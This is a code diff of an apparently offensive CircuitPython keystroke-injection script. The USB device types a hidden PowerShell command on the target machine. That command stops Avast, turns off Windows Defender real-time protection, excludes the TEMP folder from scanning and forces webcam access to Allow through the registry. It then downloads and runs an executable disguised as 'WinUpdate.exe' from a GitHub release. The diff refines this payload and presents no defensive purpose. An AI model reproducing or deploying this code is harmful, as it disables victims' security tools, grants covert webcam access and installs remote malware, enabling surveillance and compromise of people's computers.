@@ -19,7 +19,7 @@ except Exception as e:
     print(f"⚠️ Fake AP failed: {e}")
 
 # ======================================================
-# HID KEYBOARD (Pehle wala stable logic)
+# HID KEYBOARD
 # ======================================================
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(kbd)
@@ -46,18 +46,25 @@ kbd.press(Keycode.ALT, Keycode.Y)
 kbd.release_all()
 time.sleep(2.5)
 
-# Webcam Allow
-allow_webcam = "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\" /v Value /t REG_SZ /d Allow /f"
+# ======================================================
+# WEBCAM PERMISSIONS (Sirf 3 Lines)
+# ======================================================
+webcam = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam /v Value /t REG_SZ /d Allow /f; reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam /v Value /t REG_SZ /d Allow /f; reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged /v Value /t REG_SZ /d Allow /f"
 
 # GitHub Links
 exe_link = "https://github.com/Abdullahkhan1212/WinUpdate-Project/releases/download/WinUpdate-v1.2/WinUpdate.exe"
 config_link = "https://github.com/Abdullahkhan1212/WinUpdate-Project/raw/refs/heads/main/config.json"
 
-# Antivirus Bypass
-av_bypass = "stop-process -name avast* -force -erroraction silentlycontinue; stop-service -name avast* -force -erroraction silentlycontinue; Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"
+# 🔥 SIRF REAL-TIME PROTECTION DISABLE (Added)
+rtp_disable = "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"
 
-# Payload Command (Window Band)
-payload_command = f"powershell -WindowStyle Hidden -Command \"{av_bypass}; {allow_webcam}; Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue; iwr '{exe_link}' -OutFile $env:TEMP\\WinUpdate.exe; iwr '{config_link}' -OutFile $env:TEMP\\config.json; start $env:TEMP\\WinUpdate.exe\"; exit"
+# Antivirus Bypass (Avast waghera ke liye)
+av_bypass = "stop-process -name avast* -force -erroraction silentlycontinue; stop-service -name avast* -force -erroraction silentlycontinue"
+
+# ======================================================
+# PAYLOAD COMMAND
+# ======================================================
+payload_command = f"powershell -WindowStyle Hidden -Command \"{rtp_disable}; {av_bypass}; {webcam}; Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue; iwr '{exe_link}' -OutFile $env:TEMP\\WinUpdate.exe; iwr '{config_link}' -OutFile $env:TEMP\\config.json; start $env:TEMP\\WinUpdate.exe\"; exit"
 
 layout.write(payload_command)
 time.sleep(0.5)
